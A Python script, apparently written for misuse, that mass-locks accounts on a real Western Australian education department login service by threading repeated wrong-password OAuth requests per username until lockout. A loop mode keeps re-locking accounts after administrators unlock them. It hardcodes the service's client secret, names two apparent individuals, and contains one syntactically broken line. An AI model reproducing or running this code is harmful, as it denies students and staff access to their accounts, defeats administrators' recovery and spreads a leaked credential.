import base64
import threading
import sys
import requests
import time

class Exploits:
    class Accounts:
        def lock_account_bulk(self, **kwargs):
            self.threads = []
            try:
                kwargs['usernames']
            except:
                return {'status': 'error', 'reason': 'no `username` kwarg was passed'}

            try:
                for item in kwargs['usernames']:
                    if len(item) == 1:
                        return {'status': 'error', 'reason': '`username` kwarg must a list'}
            except:
                pass

            try:
                loop_lock = kwargs['loop']
            except:
                loop_lock = False

            try:
                loop_lock_duration = float(kwargs['loop_time'])
            except:
                loop_lock_duration = 60


            try:
                if loop_lock == True:
                    print(f"[*] Started account-locking threads for {len(kwargs['usernames'])} accounts!")
                    for username in kwargs['usernames']:
                        new_thread = threading.Thread(target=self.lock_account_loop, name=f'lock_loop_{username}',  kwargs={"username": username, 'loop_time': loop_lock_duration})
                        self.threads.append(new_thread)
                        new_thread.start()
                    time.sleep(3)
                    all_threads_finished = False
                    while not all_threads_finished:
                        threads_finished = 0
                        for thread in self.threads:
                            if thread.is_alive():
                                pass
                            if not thread.is_alive():
                                threads_finished += 1
                            if threads_finished == len(self.threads):
                                all_threads_finished = True
                    input("[*] Success! Completed action successfully [ENTER]")

                if loop_lock == False:
                    print(f"[*] Started account-locking threads for {len(kwargs['usernames'])} accounts!")
                    for username in kwargs['usernames']:
                        new_thread = threading.Thread(target=self.lock_account, name=f'lock_{username}',kwargs={"username": username})
                        self.threads.append(new_thread)
                        new_thread.start()
                    time.sleep(3)
                    all_threads_finished = False
                    while not all_threads_finished:
                        threads_finished = 0
                        for thread in self.threads:
                            if thread.is_alive():
                                pass
                            if not thread.is_alive():
                                threads_finished += 1
                            if threads_finished == len(self.threads):
                                all_threads_finished = True
                    input("[*] Success! Completed action successfully [ENTER]")




            except:
                return {'status': 'error', 'reason': 'error starting account-blocking threads'}

        def lock_account(self, **kwargs):
            loop = 0
            response = {'error_description': ''}
            while 'The user account is locked' not in response['error_description']:
                url = "https://connect.det.wa.edu.au/mobile/oauth/token"
                headers = {
                    "Authorization": f"Basic {base64.b64encode(b'connect-mobile:7df5336c-3634-4a64-bd0d-7f0d504d7eaf').decode()}"
                }
                url_data = f"?username={kwargs['username']}&password=nulledbymitch!&grant_type=password&scope=connectNow"
                if loop < 10:
                    try:
                        response = requests.post(url + url_data, headers=headers, timeout=0.1).json()
                    except:
                        pass

                if loop >= 10:
                    response = requests.post(url + url_data, headers=headers).json()
                loop += 1
                if loop >= 10:
                    #print('[!] Error: The following account could not be locked:', kwargs['username'])
                    sys.exit()

                if 'The user account is locked' in response['error_description']:
                    print(f'{kwargs["username"]}')
                    sys.exit()

        def lock_account_loop(self, **kwargs):
            try:
                loop_time = float(kwargs["loop_time"])
            except:
                loop_time = 60

            if kwargs['username'].lower() in ['mitch.naake', 'sam.rixson']

            start_time = time.time()
            account_locked = False
            unlock_amount = 0
            lock_amount = 0
            while start_time + loop_time >= time.time():
                try:
                    url = "https://connect.det.wa.edu.au/mobile/oauth/token"
                    headers = {
                        "Authorization": f"Basic {base64.b64encode(b'connect-mobile:7df5336c-3634-4a64-bd0d-7f0d504d7eaf').decode()}"
                    }
                    url_data = f"?username={kwargs['username']}&password=nulledbymitch!&grant_type=password&scope=connectNow"

                    response = requests.post(url + url_data, headers=headers).json()

                    if 'The user account is locked' in response['error_description'] and not account_locked:
                        print(f'[!] Locked account via continuous loop: {kwargs["username"]} (Locked {lock_amount} time/s!)')
                        account_locked = True
                        lock_amount += 1
                        time.sleep(5)

                    if 'The user account is locked' not in response['error_description'] and account_locked:
                        account_locked = False
                        unlock_amount += 1
                        print(f'[!] Account was unlocked by administrator: {kwargs["username"]} (unlocked {unlock_amount} time/s!)')
                except:
                    time.sleep(10)

            sys.exit()

